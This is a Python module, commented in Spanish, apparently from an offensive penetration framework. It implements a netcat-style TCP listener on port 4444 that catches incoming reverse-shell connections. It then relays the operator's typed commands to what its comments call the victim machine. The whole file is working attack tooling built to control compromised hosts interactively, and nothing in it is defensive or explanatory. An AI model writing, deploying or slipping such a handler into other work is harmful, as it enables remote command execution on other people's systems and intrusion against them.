import socket
import select
import sys
from modules.base_module import BaseModule

class TcpHandler(BaseModule):
    description = "Listener TCP avanzado para atrapar conexiones entrantes (estilo Netcat)"
    
    def __init__(self):
        self.options = {
            'LHOST': {'value': '0.0.0.0', 'required': True, 'desc': 'Interfaz local (0.0.0.0 para todas)'},
            'LPORT': {'value': '4444', 'required': True, 'desc': 'Puerto local a la escucha'}
        }

    def run(self):
        if not self.check_requirements() if hasattr(self, 'check_requirements') else False:
            # Re-validación por si falla el check base
            if not self.options['LPORT']['value']:
                print("[-] Error: Falta el puerto LPORT.")
                return

        lhost = self.options['LHOST']['value']
        try:
            lport = int(self.options['LPORT']['value'])
        except ValueError:
            print("[-] Error: LPORT debe ser un número entero.")
            return

        # 1. Configuración del Socket Servidor
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Permite reutilizar el puerto inmediatamente si se cierra de golpe
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            server_socket.bind((lhost, lport))
            server_socket.listen(1)
            print(f"\n[*] Iniciando TCP Handler...")
            print(f"[*] Escuchando en {lhost}:{lport} (Presiona Ctrl+C para cancelar)")
            
            # 2. Esperar conexión (Bloqueante hasta que alguien se conecte)
            client_socket, client_address = server_socket.accept()
            print(f"\n[+] ¡Conexión entrante recibida de {client_address[0]}:{client_address[1]}!")
            print("[*] Entrando en modo interactivo. Presiona Ctrl+C para cerrar la sesión.\n")

            # 3. Bucle interactivo I/O
            while True:
                # select.select monitorea múltiples flujos (el teclado y el socket)
                # Cuando uno tenga datos listos, lo procesamos.
                sockets_list = [sys.stdin, client_socket]
                read_sockets, _, _ = select.select(sockets_list, [], [])

                for s in read_sockets:
                    # Caso A: Llegan datos desde la red (la máquina víctima)
                    if s == client_socket:
                        data = client_socket.recv(4096)
                        if not data:
                            print("\n[-] La conexión fue cerrada por el equipo remoto.")
                            client_socket.close()
                            server_socket.close()
                            return
                        # Imprimimos lo que mandó la víctima directo a la pantalla
                        sys.stdout.write(data.decode('utf-8', errors='ignore'))
                        sys.stdout.flush()
                        
                    # Caso B: El usuario escribe un comando en su teclado
                    else:
                        comando = sys.stdin.readline()
                        if not comando:
                            continue
                        client_socket.send(comando.encode('utf-8'))

        except KeyboardInterrupt:
            print("\n[-] Operación cancelada por el usuario. Cerrando sockets...")
        except PermissionError:
            print(f"[-] Error: Permiso denegado para escuchar en el puerto {lport}.")
            print("    Los puertos menores a 1024 requieren privilegios de Root/Administrador.")
        except Exception as e:
            print(f"\n[-] Ocurrió un error inesperado: {e}")
        finally:
            # Limpieza segura de sockets
            try:
                client_socket.close()
            except: pass
            try:
                server_socket.close()
            except: pass
            print("[*] TCP Handler finalizado.\n")